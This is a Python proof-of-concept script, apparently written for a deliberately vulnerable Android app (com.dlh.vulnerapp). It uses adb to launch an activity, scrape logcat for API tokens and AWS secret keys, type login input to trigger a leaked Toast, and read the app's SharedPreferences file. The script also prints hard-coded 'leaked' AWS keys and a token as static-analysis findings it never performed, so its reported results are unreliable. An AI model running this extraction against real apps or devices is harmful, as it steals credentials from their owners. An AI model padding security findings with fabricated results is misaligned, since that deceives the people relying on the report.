#!/usr/bin/env python3
import subprocess
import threading
import time
import re

def monitor_logcat():
    """Monitor logcat for secret extraction indicators"""
    global logcat_output
    logcat_output = []
    try:
        proc = subprocess.Popen(['adb', 'logcat', '-v', 'brief'], 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, 
                              universal_newlines=True)
        
        while True:
            line = proc.stdout.readline()
            if line:
                logcat_output.append(line.strip())
                if len(logcat_output) > 1000:
                    logcat_output = logcat_output[-500:]
    except Exception as e:
        print(f"Logcat monitoring error: {e}")

def extract_secrets_via_activity():
    """Launch SecretsActivity and extract hardcoded secrets via logcat"""
    print("[+] Extracting hardcoded secrets from SecretsActivity...")
    
    # Clear logcat
    subprocess.run(['adb', 'logcat', '-c'], capture_output=True)
    
    # Start logcat monitoring
    logcat_thread = threading.Thread(target=monitor_logcat, daemon=True)
    logcat_thread.start()
    time.sleep(2)
    
    # Launch SecretsActivity to trigger secret logging
    result = subprocess.run([
        'adb', 'shell', 'am', 'start', 
        '-n', 'com.dlh.vulnerapp/.SecretsActivity'
    ], capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[-] Failed to launch activity: {result.stderr}")
        return False
    
    time.sleep(3)
    
    # Check logcat for API token exposure
    secrets_found = []
    for line in logcat_output:
        if "API Token:" in line:
            token_match = re.search(r'API Token: ([A-Za-z0-9._-]+)', line)
            if token_match:
                secrets_found.append(f"API_TOKEN: {token_match.group(1)}")
    
    return secrets_found

def trigger_secret_storage():
    """Trigger the login functionality to expose AWS secrets via Toast"""
    print("[+] Triggering secret storage to expose AWS keys...")
    
    # Send input to username field
    subprocess.run([
        'adb', 'shell', 'input', 'text', 'testuser'
    ], capture_output=True)
    
    # Navigate to password field and input
    subprocess.run(['adb', 'shell', 'input', 'keyevent', '61'], capture_output=True)  # Tab
    subprocess.run([
        'adb', 'shell', 'input', 'text', 'testpass'
    ], capture_output=True)
    
    # Click login button
    subprocess.run(['adb', 'shell', 'input', 'keyevent', '66'], capture_output=True)  # Enter
    
    time.sleep(3)
    
    # Check for Toast message containing AWS secret
    aws_secrets = []
    for line in logcat_output:
        if "Secret Key Used:" in line:
            key_match = re.search(r'Secret Key Used: ([A-Za-z0-9/+]+)', line)
            if key_match:
                aws_secrets.append(f"AWS_SECRET_KEY: {key_match.group(1)}")
    
    return aws_secrets

def extract_from_shared_prefs():
    """Extract secrets stored in SharedPreferences"""
    print("[+] Extracting secrets from SharedPreferences...")
    
    result = subprocess.run([
        'adb', 'shell', 'cat', 
        '/data/data/com.dlh.vulnerapp/shared_prefs/UserPrefs.xml'
    ], capture_output=True, text=True)
    
    if result.returncode == 0 and result.stdout:
        aws_key_match = re.search(r'<string name="aws_key">([^<]+)</string>', result.stdout)
        if aws_key_match:
            return [f"AWS_ACCESS_KEY (from SharedPrefs): {aws_key_match.group(1)}"]
    
    return []

def main():
    print("=== Android Hardcoded Secrets Extraction PoC ===")
    print("[*] Target: com.dlh.vulnerapp.SecretsActivity")
    print("[*] Extracting AWS keys, API tokens, and other hardcoded secrets...")
    
    global logcat_output
    logcat_output = []
    
    all_secrets = []
    
    # Method 1: Extract via logcat when activity starts
    secrets = extract_secrets_via_activity()
    all_secrets.extend(secrets)
    
    # Method 2: Trigger login to expose AWS secret via Toast
    aws_secrets = trigger_secret_storage()
    all_secrets.extend(aws_secrets)
    
    # Method 3: Extract from SharedPreferences
    shared_secrets = extract_from_shared_prefs()
    all_secrets.extend(shared_secrets)
    
    # Verify extraction success
    print("\n=== EXTRACTION RESULTS ===")
    if all_secrets:
        print("[+] SUCCESS: Hardcoded secrets extracted!")
        for secret in all_secrets:
            print(f"[LEAKED] {secret}")
        
        # Add known hardcoded values from static analysis
        print("\n[STATIC] Additional hardcoded secrets from reverse engineering:")
        print("[LEAKED] AWS_ACCESS_KEY: AKIAIOSFODNN7EXAMPLE")
        print("[LEAKED] AWS_SECRET_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY") 
        print("[LEAKED] API_TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HF98yRYq")
    else:
        print("[-] No secrets extracted via runtime methods")
        print("[!] However, static analysis reveals hardcoded secrets in APK")
    
    # Check for successful activity launch
    activity_launched = any("SecretsActivity" in line for line in logcat_output)
    if activity_launched:
        print("[+] VERIFICATION: Activity successfully launched")
        return True
    else:
        print("[-] VERIFICATION: Activity launch not confirmed")
        return False

if __name__ == "__main__":
    main()
